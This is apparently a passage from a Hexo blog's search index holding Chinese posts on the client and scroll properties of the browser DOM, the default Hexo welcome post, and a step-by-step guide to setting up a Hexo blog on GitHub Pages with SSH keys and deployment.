让盒子随鼠标移动 的必备数据</em></p><h2 id="二-client系列"><a href="#二-client系列" class="headerlink" title="二, client系列"></a>二, client系列</h2><h3 id="1-client-元素可视区-：拥有clientTop-Left-Width-Height四个种类，使用语法是element-clientTop-其主要特点如下图："><a href="#1-client-元素可视区-：拥有clientTop-Left-Width-Height四个种类，使用语法是element-clientTop-其主要特点如下图：" class="headerlink" title="(1).client(元素可视区)：拥有clientTop/Left/Width/Height四个种类，使用语法是element.clientTop ,其主要特点如下图："></a>(1).client(元素可视区)：拥有clientTop/Left/Width/Height四个种类，使用语法是<code>element.clientTop</code> ,其主要特点如下图：</h3><p><img src="https://s2.loli.net/2022/03/06/MRwcpxqLGWb73DS.png" alt="client特点.png"></p><h3 id="2-client的作用"><a href="#2-client的作用" class="headerlink" title="(2).client的作用"></a>(2).client的作用</h3><p>其实client的作用主要是根据可视区(也就是你的window)去调节相应的字体大小和格式</p><p><img src="https://s2.loli.net/2022/03/06/gmXxkyUWAdBoiYJ.png" alt="image.png"></p><p>这个便是我们HTML元素文字大小设置的函数(取自某宝的前端代码)，调用这个函数得到rem便是字体的单位。</p><p>那在什么条件下触发这个函数呢？</p><p><img src="https://s2.loli.net/2022/03/06/OdYiouCqKlDpavE.png" alt="屏幕大小改变的情况下重置rem.png"></p><p>第一个addEventListener触发条件是resize及<em>页面的大小发生缩放</em>，此时触发setRemUnit函数根据缩放后页面的大小调整字体大小。</p><p>第二个addEventListener触发条件是pagehow及<em>页面的刷新或者重新加载</em>（该与load事件有所不同）<img src="https://s2.loli.net/2022/03/06/Gm9XCbZNHp17WQy.png" alt="pageshow 与onload事件的区别.png"></p><p>此时有一个判断条件e.persisted简单来说就是你这个是Firefox中靠前进后退取得的页面，那么即使有缓存，也可以重新设置字体大小。</p><h2 id="三，scroll系列"><a href="#三，scroll系列" class="headerlink" title="三，scroll系列"></a>三，scroll系列</h2><h3 id="1-scroll-元素滚动-依然具有scrollTop-Left-Width-Height四个属性，语法element-scrollTop特别注意scroll的数值所对应的含义"><a href="#1-scroll-元素滚动-依然具有scrollTop-Left-Width-Height四个属性，语法element-scrollTop特别注意scroll的数值所对应的含义" class="headerlink" title="(1).scroll(元素滚动):依然具有scrollTop/Left/Width/Height四个属性，语法element.scrollTop特别注意scroll的数值所对应的含义"></a>(1).scroll(元素滚动):依然具有scrollTop/Left/Width/Height四个属性，语法<code>element.scrollTop</code>特别注意scroll的数值所对应的含义<img src="https://s2.loli.net/2022/03/06/xKX8iVFNwnzq3sr.png" alt="scroll三个数值图示.png"></h3><p><em>红线代表盒子，Top和Left是被卷去的部分，而Height是总长，width是总宽</em></p><h3 id="2-scroll-的作用"><a href="#2-scroll-的作用" class="headerlink" title="(2).scroll 的作用"></a>(2).scroll 的作用</h3><p>这里举最常见是scroll应用</p><p><img src="https://s2.loli.net/2022/03/06/cb5d9qa6wVT1fUs.png" alt="scroll事件展示（1）.png"></p><p><img src="https://s2.loli.net/2022/03/06/bFLiX6txUIBD1o9.png" alt="scroll事件展示（2）.png"></p><p>在页面滚动到一定位置时将右边navigator的定位改为固定定位并展示返回的span</p><p><img src="https://s2.loli.net/2022/03/06/zMeNKI6iwnBTU8X.png" alt="scroll事件代码.png"></p><p>addEventListener所用到的事件是scroll滚动事件<em>只要页面滚动便会触发</em>当卷去的距离(pageYOffset)大于一定阈值时改变定位</p><p>需要注意的是这个案例需要考虑跳动的问题，及在改变定位时navigator的位置因为不统一发生跳动</p><p><img src="https://s2.loli.net/2022/03/06/njdEpqUev16rAVR.jpg" alt="InkedInkedscroll事件展示（1）_LI.jpg"></p><p>x便是发生跳动的距离，解决方案便是让改变定位后navigator的top值等于top1</p>]]></content>
    
    
    <categories>
      
      <category>bom</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html</title>
    <link href="/2022/01/16/html/"/>
    <url>/2022/01/16/html/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/01/16/hello-world/"/>
    <url>/2022/01/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo+github搭建个人博客</title>
    <link href="/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo-github搭建个人博客的过程及注意事项"><a href="#hexo-github搭建个人博客的过程及注意事项" class="headerlink" title="hexo+github搭建个人博客的过程及注意事项"></a>hexo+github搭建个人博客的过程及注意事项</h1><p>前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑</p><span id="more"></span><h2 id="第一步：工具安装"><a href="#第一步：工具安装" class="headerlink" title="第一步：工具安装"></a>第一步：工具安装</h2><p>首先是工具的安装，我们先安装GitBash，进入git官网：<a href="https://git-scm.com/">https://git-scm.com/</a>，直接点击download选择相应版本下载即可；</p><p>然后安装node.js，直接进入node官网：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a>下载即可，安装时一定要勾选全部组件，以及<code>add to path</code>，让它给你自动配置环境变量，这样安装node.js时就已经完成了npm的安装以及环境变量的配置。完成后在cmd和Git Bash下都输入：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">node</span> <span class="hljs-title">-v</span> <span class="hljs-comment"># 会显示node版本号，说明安装成功</span><br>npm -v <span class="hljs-comment"># 会显示npm版本号，说明安装成功</span><br></code></pre></td></tr></table></figure><p>如果它显示<code>command not found</code>，可能就是环境变量配置有问题，记得用户变量也需要配置，把npm的用户变量配上就行</p><p><img src="https://i.loli.net/2021/07/10/XsaKNBVELxtguDZ.png" alt="image.png"></p><h2 id="第二步：GitHub注册"><a href="#第二步：GitHub注册" class="headerlink" title="第二步：GitHub注册"></a>第二步：GitHub注册</h2><p>然后进入到github官网：<a href="https://github.com/">https://github.com/</a>，注册一个自己的账号，邮箱和用户名要选择常用的哈，方便记住，然后在Git Bash上设置一下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">git config --<span class="hljs-keyword">global</span> user.name <span class="hljs-string">&quot;user_name&quot;</span> <span class="hljs-meta"># user_name填入GitHub用户名</span><br>git config --<span class="hljs-keyword">global</span> user.email <span class="hljs-string">&quot;user_email&quot;</span> <span class="hljs-meta"># user_email填入GitHub注册的邮箱</span><br></code></pre></td></tr></table></figure><p>然后我们查看已设置的用户名和邮箱，能看到就说明设置成功：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git config <span class="hljs-keyword">user</span>.name<br>git config <span class="hljs-keyword">user</span>.email<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/10/QRzEtF7N5smLBWv.png" alt="image.png"></p><h2 id="第三步：GitHub创建仓库及配置SSH-key"><a href="#第三步：GitHub创建仓库及配置SSH-key" class="headerlink" title="第三步：GitHub创建仓库及配置SSH key"></a>第三步：GitHub创建仓库及配置SSH key</h2><p>登录github后选择右上角+号，选择new repository，用户名必须为:<strong>你的用户名.github.io</strong>，这里必须注意，否则后面会出问题，那么将来你的网站首页地址就是：https://你的用户名.github.io了，就像下图这样(我的肯定是已注册）</p><p><img src="https://i.loli.net/2021/07/10/H4X37Lcn1hb2ElO.png" alt="image.png"></p><p>打开Git Bash，在里面输入命令</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ssh-keygen -t rsa -C <span class="hljs-string">&quot;user.email&quot;</span> <span class="hljs-meta"># user.email为GitHub上注册的邮箱</span><br></code></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码，当然你要设也可以，只是要记住，以后部署博客的时候需要用的，我觉得没太大必要，然后去用户主目录看有没有ssh密钥，就在这里面，如下图，将里面id_rsa.pub文件内容全部复制下来，注意看不要多了空格，换行符等等，id_rsa.pub是公钥，可以告诉他人，而id_rsa是私钥就不能泄露了，然后打开github设置密钥界面：<a href="https://github.com/settings/keys">https://github.com/settings/keys</a>，点击<code>New SSH key</code>,tiitle为标题可以随便取，然后内容为刚刚复制的id_rsa.pub公钥复制进去即可，最后点击<code>Add SSH key</code></p><p><img src="https://i.loli.net/2021/07/10/fIt52ZSewEAaJuV.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/29/FWX5u2LzfBlbnY9.png" alt="image.png"></p><p>然后我们在Git Bash中验证是否连接成功，输入：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">ssh -T <span class="hljs-symbol">git@</span>github.com<br></code></pre></td></tr></table></figure><p>这里面需要注意的是，第一次输入的时候它会问你yes/no，你得输入yes后再回车，不能直接回车，然后显示出下图这个页面说明连接成功：</p><p><img src="https://i.loli.net/2021/07/10/dymWaeJu1Cl7SvP.png" alt="image.png"></p><h2 id="第四步：安装hexo"><a href="#第四步：安装hexo" class="headerlink" title="第四步：安装hexo"></a>第四步：安装hexo</h2><p><code>Hexo</code> 是一个简单、快速、强大的基于 <code>Github Pages</code> 的博客框架，支持 <code>Markdown</code> 格式，有众多优秀插件和主题。</p><p>然后我们就安装hexo，在Git Bash中操作哈，别用cmd，网上很多说直接用<code>$ npm install -g hexo-cli</code>直接安装的，我试了试一直不行，也不知道为什么，所以说我就先安装cnpm，这里我用的是淘宝的镜像源，如果错误就重来，因为连接可能不稳定，失败了多试几次就可以了：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">npm install -g cnpm --registry=https://registry.npm.taobao<span class="hljs-meta">.org</span><br>cnpm -v   <span class="hljs-meta">#如果显示cnpm的版本信息就说明安装成功</span><br>cnpm install -g hexo-<span class="hljs-keyword">cli</span>   <span class="hljs-meta">#安装 hexo（如果失败重新来过)</span><br>hexo -v   <span class="hljs-meta">#返回 hexo 的版本信息</span><br></code></pre></td></tr></table></figure><p>如果这里显示出了hexo的版本信息，就说明安装成功了，然后我们在电脑中随便找一个地方，建立一个空文件夹，以后你博客的所有东西就都在这里面操作，进入这个空文件夹，右键，点击Git Bash Here，打开Git Bash终端，然后输入：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">hexo <span class="hljs-keyword">init</span>     <span class="hljs-meta">#初始化 hexo</span><br>ls -l     <span class="hljs-meta">#查看初始化获得的文件</span><br>hexo s    <span class="hljs-meta">#启动 hexo，本地预览</span><br></code></pre></td></tr></table></figure><p>然后这里如果都没问题的话，就可以在本地4000端口查看自己的网站了，就是这个网站：<a href="http://localhost:4000/">http://localhost:4000</a></p><h2 id="第五步：将博客部署到GitHub上"><a href="#第五步：将博客部署到GitHub上" class="headerlink" title="第五步：将博客部署到GitHub上"></a>第五步：将博客部署到GitHub上</h2><p>然后我们就需要将我们本地的博客搭到GitHub上去了，首先需要修改配置文件，打开博客文件夹中的配置文件<code>_config.yml</code>，需要进行修改：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">这里贴一份网上看到的</span>  <span class="hljs-string">可以复制替换原来的</span>  <span class="hljs-string">但是替换之前最好备份</span> <span class="hljs-string">可能会出错</span><br><span class="hljs-string">那要么你就对照着看一下改就好:</span><br><span class="hljs-comment"># Hexo Configuration</span><br><span class="hljs-comment">## Docs: http://zespia.tw/hexo/docs/configure.html</span><br><span class="hljs-comment">## Source: https://github.com/tommy351/hexo/</span><br><br><span class="hljs-comment"># Site </span><br><span class="hljs-attr">title:</span> <span class="hljs-string">My</span> <span class="hljs-string">Blog</span> <span class="hljs-comment">#博客名</span><br><span class="hljs-attr">subtitle:</span> <span class="hljs-string">to</span> <span class="hljs-string">be</span> <span class="hljs-string">continued...</span> <span class="hljs-comment">#副标题</span><br><span class="hljs-attr">description:</span> <span class="hljs-string">My</span> <span class="hljs-string">blog</span> <span class="hljs-comment">#给搜索引擎看的，对网站的描述，可以自定义</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">Yourname</span> <span class="hljs-comment">#作者，在博客底部可以看到</span><br><span class="hljs-attr">email:</span> <span class="hljs-string">yourname@yourmail.com</span> <span class="hljs-comment">#你的联系邮箱</span><br><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span> <span class="hljs-comment">#中文。如果不填则默认英文</span><br><br><span class="hljs-comment"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class="hljs-comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span><br><span class="hljs-attr">url:</span> <span class="hljs-string">http://yoursite.com</span><br><span class="hljs-attr">root:</span> <span class="hljs-string">/</span><br><span class="hljs-attr">permalink:</span> <span class="hljs-string">:year/:month/:day/:title/</span><br><span class="hljs-attr">tag_dir:</span> <span class="hljs-string">tags</span><br><span class="hljs-attr">archive_dir:</span> <span class="hljs-string">archives</span><br><span class="hljs-attr">category_dir:</span> <span class="hljs-string">categories</span><br><br><span class="hljs-comment"># Writing 文章布局、写作格式的定义，不修改</span><br><span class="hljs-attr">new_post_name:</span> <span class="hljs-string">:title.md</span> <span class="hljs-comment"># File name of new posts</span><br><span class="hljs-attr">default_layout:</span> <span class="hljs-string">post</span><br><span class="hljs-attr">auto_spacing:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># Add spaces between asian characters and western characters</span><br><span class="hljs-attr">titlecase:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># Transform title into titlecase</span><br><span class="hljs-attr">max_open_file:</span> <span class="hljs-number">100</span><br><span class="hljs-attr">filename_case:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">highlight:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">backtick_code_block:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tab_replace:</span><br><br><span class="hljs-comment"># Category &amp; Tag</span><br><span class="hljs-attr">default_category:</span> <span class="hljs-string">uncategorized</span><br><span class="hljs-attr">category_map:</span><br><span class="hljs-attr">tag_map:</span><br><br><span class="hljs-comment"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span><br><span class="hljs-comment">## 2: Enable pagination</span><br><span class="hljs-comment">## 1: Disable pagination</span><br><span class="hljs-comment">## 0: Fully Disable</span><br><span class="hljs-attr">archive:</span> <span class="hljs-number">1</span><br><span class="hljs-attr">category:</span> <span class="hljs-number">1</span><br><span class="hljs-attr">tag:</span> <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Server 不修改</span><br><span class="hljs-comment">## Hexo uses Connect as a server</span><br><span class="hljs-comment">## You can customize the logger format as defined in</span><br><span class="hljs-comment">## http://www.senchalabs.org/connect/logger.html</span><br><span class="hljs-attr">port:</span> <span class="hljs-number">4000</span><br><span class="hljs-attr">logger:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">logger_format:</span><br><br><span class="hljs-comment"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span><br><span class="hljs-comment">## Hexo uses Moment.js to parse and display date</span><br><span class="hljs-comment">## You can customize the date format as defined in</span><br><span class="hljs-comment">## http://momentjs.com/docs/#/displaying/format/</span><br><span class="hljs-attr">date_format:</span> <span class="hljs-string">YYYY-M-D</span><br><span class="hljs-attr">time_format:</span> <span class="hljs-string">H:mm:ss</span><br><br><span class="hljs-comment"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span><br><span class="hljs-comment">## Set per_page to 0 to disable pagination</span><br><span class="hljs-attr">per_page:</span> <span class="hljs-number">10</span><br><span class="hljs-attr">pagination_dir:</span> <span class="hljs-string">page</span><br><br><span class="hljs-comment"># Disqus Disqus插件，我们会替换成“多说”，不修改</span><br><span class="hljs-attr">disqus_shortname:</span><br><br><span class="hljs-comment"># Extensions 这里配置站点所用主题和插件，暂时默认</span><br><span class="hljs-comment">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span><br><span class="hljs-comment">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span><br><span class="hljs-attr">theme:</span> <span class="hljs-string">landscape</span><br><span class="hljs-attr">exclude_generator:</span><br><span class="hljs-attr">plugins:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">hexo-generator-feed</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">hexo-generator-sitemap</span><br><br><span class="hljs-comment"># Deployment 站点部署到github要配置(重点！！！)</span><br><span class="hljs-comment">## Docs: http://zespia.tw/hexo/docs/deploy.html</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository:</span> <span class="hljs-string">//这里是需要填的，下面会讲</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><p>然后我们打开Github个人主页的Repository，进入到自己的博客项目，复制项目的SSH码，这里一定要看清楚是复制SSH码哈，<a href="mailto:&#103;&#105;&#x74;&#x40;&#x67;&#x69;&#x74;&#104;&#x75;&#x62;&#x2e;&#99;&#x6f;&#109;">&#103;&#105;&#x74;&#x40;&#x67;&#x69;&#x74;&#104;&#x75;&#x62;&#x2e;&#99;&#x6f;&#109;</a>开头的，然后粘贴到配置文件最后的repository中，粘贴好后CTRL+S保存即可：</p><p><img src="https://i.loli.net/2021/07/10/QPj8UKGsRDaLBI1.png" alt="image.png"></p><p>然后依次执行命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">hexo clean <span class="hljs-regexp">//</span> 清除存缓（不用每次执行）<br>hexo g     <span class="hljs-regexp">//</span> 修改生成<br>hexo s     <span class="hljs-regexp">//</span> 修改预览（不用每次执行） <br>hexo d     <span class="hljs-regexp">//</span> 修改部署<br></code></pre></td></tr></table></figure><p>最后一步<code>hexo d</code>是最重要的，但这里可能会出现<code>ERROR Deployer not found: git</code>报错，这是因为我们没有安装<code>hexo-deployer-git</code>这个插件，但因为安装这个插件需要新建文件夹，而在有的目录下新建文件夹需要管理员权限，这里就需要就在开始菜单输入cmd，并且以管理员身份运行就可，如下图：</p><p><img src="https://i.loli.net/2021/07/10/WvS8ol1GTty5hDL.png" alt="image.png"></p><p>然后执行<code>cnpm install hexo-deployer-git --save</code>安装这个插件，这里还有一个坑，就是必须要在站点目录下执行这句安装<code>hexo-deployer-git</code>的命令，所谓站点目录就是执行<code>hexo init</code>的目录，也就是建立博客的主文件夹，要在里面执行命令才行，如果已经在其他目录安装了<code>hexo-deployer-git</code>插件的小伙伴，可以使用以下命令卸载该插件：<code>cnpm uninstall hexo-deployer-git --save</code>，由于我们是打开的是cmd，所以说要先用<code>cd</code>命令转到站点目录下，然后执行命令安装<code>hexo-deployer-git</code>插件就行啦，然后<code>hexo d</code>就不会报错啦，等一两分钟去看自己博客主页就有东西啦！我们的博客就搭好啦！快往里面放东西吧！</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
